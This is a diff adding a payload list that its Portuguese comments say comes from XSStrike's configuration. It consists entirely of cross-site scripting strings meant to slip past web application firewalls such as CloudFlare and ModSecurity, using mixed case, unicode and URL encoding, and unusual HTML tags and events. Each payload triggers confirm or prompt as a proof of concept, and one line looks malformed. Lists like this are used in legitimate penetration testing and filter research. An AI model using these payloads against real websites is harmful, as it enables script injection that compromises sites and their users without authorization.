@@ -1,0 +1,28 @@
+# XSStrike WAF Bypass Payloads — extraído de XSStrike/core/config.py
+# Payloads provados contra WAFs reais (CloudFlare, ModSecurity, AWS WAF, etc.)
+# Tags alternativas de baixa detecção + unicode + encoding
+'"</Script><Html Onmouseover=(confirm)//
+<imG/sRc=l oNerrOr=(prompt)() x>
+<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>
+<deTails open oNToggle=confi\u0072m()>
+<img sRc=l oNerrOr=(confirm)() x>
+<svg/x=">"/onload=confirm()//
+<svg%0Aonload=%09((pro\u006dpt))()//
+<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>
+<sCript x>confirm``</scRipt x>
+<deTails/open/oNToggle="(confirm)``">
+<img src=x onerror="a]cfi)([rmo]"[1]>
+<svg onload=confirm&lpar;1&rpar;>
+<details open ontoggle=confirm()>
+<a href="javascript:confirm(1)">XSS</a>
+<img src onerror=confirm``>
+<svg><animate onbegin=confirm() attributeName=x dur=1s>
+<math><mtext></table><img src onerror=confirm()>
+<input onfocus=confirm() autofocus>
+<marquee onstart=confirm()>
+<video><source onerror=confirm()>
+<audio src onerror=confirm()>
+<body/onload=confirm()>
+<object data="data:text/html,<script>confirm(1)</script>">
+<iframe srcdoc="<script>confirm(1)</script>">
+<svg><script>confirm&lpar;1&rpar;</script>
